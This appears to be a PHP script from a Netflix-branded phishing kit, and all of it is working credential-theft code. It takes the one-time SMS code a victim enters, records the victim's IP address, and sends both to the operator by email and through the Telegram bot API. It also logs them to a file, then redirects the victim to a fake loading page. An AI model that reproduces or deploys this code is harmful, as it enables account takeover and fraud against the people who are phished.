<?php
session_start();
require '../config.php';
$Cashout = getenv("REMOTE_ADDR");
$logFile = '../logs.txt';
$logEntry = "---- Netflix otp ERROR $Cashout  ------\n";
$logEntry .= "SMS: " .  $_POST['otp'] . "\n";
$logEntry .= "-------------------------------\n";
$logEntry .= "IP: " .$Cashout. "\n";
$logEntry .= "-----------💓 TELEGRAM  : @mr_coder_x1 💓---------------\n";
$_SESSION['sms'] = true;

mail($email, "Netflix otp $Cashout", $logEntry);
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $logEntry
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);
file_put_contents($logFile, $logEntry, FILE_APPEND);

function generateRandomString($length = 34) {
    return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / 62))), 0, $length);
}
sleep(2);
// Store the random string in the session
$_SESSION['random_string'] = generateRandomString();
$randomNumber = $_SESSION['random_string'];
header("Location: ./loading2.php?id=CVB6N38DCNTVTBCN3CBVBNV536BN39BR4V7T6BY7NZU");
